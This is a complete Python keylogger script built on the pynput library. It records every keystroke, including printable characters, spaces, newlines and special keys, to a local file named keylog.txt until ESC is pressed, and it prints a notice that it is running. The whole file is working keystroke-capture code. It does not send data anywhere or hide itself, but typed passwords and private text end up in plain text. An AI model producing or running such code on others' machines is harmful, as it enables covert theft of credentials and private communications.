from pynput import keyboard
import os
from datetime import datetime

LOG_FILE = "keylog.txt"

def write_to_file(key):
    """Write the pressed key to the log file."""
    try:
        with open(LOG_FILE, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            elif key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            else:
                file.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def on_press(key):
    """Handle key press events."""
    write_to_file(key)

def on_release(key):
    """Handle key release events."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    print("Keylogger running... (Press ESC to stop)")
    print(f"Logs will be saved in {os.path.abspath(LOG_FILE)}")
    
    with open(LOG_FILE, "w") as file:
        file.write(f"Keylogger started at {datetime.now()}\n\n")
    
    # Start listening for key events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
